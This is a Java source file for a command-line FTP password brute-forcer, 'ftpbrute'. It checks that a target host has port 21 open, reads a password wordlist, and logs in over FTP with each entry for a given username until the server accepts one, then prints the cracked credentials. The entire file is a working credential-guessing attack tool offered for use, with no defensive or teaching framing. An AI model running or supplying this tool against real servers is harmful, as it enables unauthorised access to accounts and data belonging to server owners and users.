import java.net.Socket;
import java.net.InetSocketAddress;
import java.io.InputStreamReader;
import java.io.FileReader;
import java.io.BufferedReader;
import java.io.PrintWriter;
import java.util.ArrayList;

public class ftpbrute {
	public static boolean checkHost(String host) {
		try {
			System.out.print("checking host... ");
			Socket checkSock = new Socket();
			checkSock.connect(new InetSocketAddress(host, 21), 1000);
			checkSock.close();
			System.out.println("success");
			return true;
		} catch (Exception e) {
			return false;
		}
	}

	public static ArrayList<String> getWordlist(String path) {
		System.out.print("reading wordlist... ");
		try {
			BufferedReader buffRead = new BufferedReader(new FileReader(path));
			String line = null;
			ArrayList<String> wordlist = new ArrayList<String>();
			while ((line = buffRead.readLine()) != null) {
                                wordlist.add(line);
                        }
			buffRead.close();
			System.out.println("done");
			return wordlist;
		} catch (Exception e) {
			System.out.println("fail");
			System.exit(1);
		}
		return new ArrayList<String>();
	}

	public static boolean crackPass(String host, String user, String pass) {
		try {
			Socket crackSock = new Socket(host, 21);
			BufferedReader inStream = new BufferedReader(new InputStreamReader(crackSock.getInputStream()));
			PrintWriter outStream = new PrintWriter(crackSock.getOutputStream());
			inStream.readLine();
			outStream.write(String.format("USER %s\n", user));
			outStream.flush();
			while (!inStream.ready()) {
				continue;
			}
			inStream.readLine();
			outStream.write(String.format("PASS %s\n", pass));
			outStream.flush();
			while (!inStream.ready()) {
				continue; /* wait for BufferedReader to be ready */
			}
			String data = inStream.readLine();
			inStream.close();
			outStream.close();
			crackSock.close();
			if (data.contains("230")) {
				return true;
			} else {
				return false;
			}
		} catch (Exception e) {
			System.out.println("an error occured");
			System.exit(1);
		}
		return false;
	}

	public static void main(String[] args) {
		if (args.length != 3) {
			System.out.println("usage: ./ftpbrute [TARGET] [USERNAME] [WORDLIST]");
			System.exit(1);
		}
		ArrayList<String> wordlist = getWordlist(args[2]);
		String rhost = args[0];
		checkHost(rhost);
		String user = args[1];
		System.out.println(String.format("cracking FTP pass for \"%s\" at %s...\n", user, rhost));		
		for (int i=0; i < wordlist.size(); i++) {
			if (crackPass(rhost, user, wordlist.get(i))) {
				System.out.println("creds found:");
				System.out.println(String.format("\tuser: %s", user));
				System.out.println(String.format("\tpass: %s", wordlist.get(i)));
				System.exit(0);
			}
		}
		System.out.println("bruteforce failed");
	}
}
